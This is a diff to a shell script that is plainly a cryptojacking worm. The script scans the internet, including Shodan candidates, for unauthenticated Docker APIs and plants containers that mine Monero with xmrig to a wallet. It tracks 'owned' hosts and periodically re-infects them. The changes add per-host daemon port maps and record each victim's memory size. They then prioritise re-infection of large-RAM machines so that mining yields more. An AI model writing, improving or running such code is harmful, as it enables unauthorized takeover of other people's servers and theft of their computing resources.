@@ -26,7 +26,7 @@ SYSDIR="${SYSDIR:-/tmp/.sysd}"
 # so it would otherwise swallow an ad-hoc "DOCK_PAR=5 sh dock.sh". Precedence:
 # environment > worker.env > built-in default.
 E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
-E_REARM="${DOCK_REARM:-}"; E_RMAX="${DOCK_REARM_MAX:-}"
+E_REARM="${DOCK_REARM:-}"; E_RMAX="${DOCK_REARM_MAX:-}"; E_PORTS="${DOCK_PORTS:-}"
 [ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
 [ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
 WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
@@ -65,6 +65,19 @@ TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
 LEDGER="$WORK/dock.recheck"       # known daemons NOT currently ours (rotates)
 touch "$SEEN" "$TRIED" "$OWNFILE" "$LEDGER"
+RAMFILE="$WORK/dock.ram"     # ip \t MemTotal - victim size, drives the re-arm order
+PORTMAP="$WORK/dock.ports"   # ip \t daemon port, from mass.found's verified rows
+# mass.found holds two kinds of row: sweep-verified daemons ("ip<TAB>docker=ver@port",
+# older ones without the @port) and unverified shodan candidates ("ip<TAB>shodan[-search]").
+# Keep a map of the verified rows so the probe stops guessing: measured, 100% of our live
+# daemons answer on plain :2375, while ~96% of *candidates* are simply dead - so an
+# unverified row gets one timeout instead of three, a ~3x faster scan of the queue.
+awk -F'\t' 'NF > 1 && $2 !~ /shodan/ {
+        p = "2375"
+        if (match($2, /@[0-9]+$/)) p = substr($2, RSTART + 1)
+        print $1 "\t" p
+    }' "$WORK/mass.found" 2>/dev/null | tr -d '\r' | sort -u > "$PORTMAP" 2>/dev/null || :
+touch "$RAMFILE"
 NOW=$(date +%s)
 
 [ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
@@ -124,7 +137,14 @@ BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"
 # a host is interesting only if a docker API answers - so verify it IS docker,
 # not just an open port (and no /dev/tcp, so bash is not required either)
 endpoint() {
-    for p in $PORTS; do
+    # Per-host port list: the recorded port (plus fallbacks) for a host we have already
+    # seen answer as a daemon, otherwise :2375 only. DOCK_PORTS set explicitly wins.
+    plist="$PORTS"
+    if [ -z "${E_PORTS:-}" ]; then
+        rp=$(grep -m1 "^$1	" "$PORTMAP" 2>/dev/null | cut -f2)
+        if [ -n "$rp" ]; then plist="$rp $PORTS"; else plist="2375"; fi
+    fi
+    for p in $plist; do
         case "$p" in
             2375|4243) b="http://$1:$p";  o="" ;;
             2376) b="https://$1:2376"; o="-k" ;;
@@ -166,8 +186,11 @@ dock_one() {
     # an existing container of ours is worth touching (handled above).
     if [ "$SKIPSELF" = yes ]; then
         me=$(hostname 2>/dev/null) || me=""
-        nm=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null \
-             | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
+        inf=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null) || inf=""
+        nm=$(printf '%s' "$inf" | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
+        # record victim size while we are here - one field, used to order re-arms
+        memb=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
+        if [ -n "$memb" ]; then printf '%s\t%s\n' "$1" "$memb" >> "$RAMFILE"; fi
         if [ -n "$me" ] && [ "$nm" = "$me" ]; then
             echo "dock: $ip is this host (payload mines here already)"
             return 0
@@ -331,10 +354,19 @@ awk -F'\t' '!s[$1]++' "$OWNFILE" > "$OWNFILE.n" 2>/dev/null && mv -f "$OWNFILE.n
 if [ "$REARM" = yes ]; then
     cut -f1 "$OWNFILE" 2>/dev/null | sort -u > "$WORK/own.$$" || :
     grep -vxF -f "$WORK/own.$$" "$SEEN" 2>/dev/null | sort -u > "$WORK/lg.$$" || :
+    # Order the ledger big-host-first. A sub-1GB box cannot hold RandomX's 2GB dataset,
+    # so xmrig drops to light mode and tops out ~100-200 H/s - the scarce re-check
+    # budget belongs to machines that can actually produce. Unknown sizes sort last.
+    if [ -s "$RAMFILE" ]; then
+        sort -u "$RAMFILE" -o "$RAMFILE" 2>/dev/null || :
+        awk -F'\t' 'NR==FNR { m[$1]=$2; next } { print (($1 in m) ? m[$1] : 0) "\t" $1 }' \
+            "$RAMFILE" "$WORK/lg.$$" 2>/dev/null | sort -rn | cut -f2 > "$WORK/lg3.$$" &&
+            mv -f "$WORK/lg3.$$" "$WORK/lg.$$" || :
+    fi
     tail -n +$((REARM_MAX + 1)) "$WORK/lg.$$" > "$WORK/lg2.$$" 2>/dev/null || :
     head -n "$REARM_MAX" "$WORK/lg.$$" >> "$WORK/lg2.$$" 2>/dev/null || :
     mv -f "$WORK/lg2.$$" "$LEDGER" 2>/dev/null || cp -f "$WORK/lg2.$$" "$LEDGER"
-    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$"
+    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$" "$WORK/lg3.$$"
 fi
 owned_now=$(wc -l < "$OWNFILE")
 echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
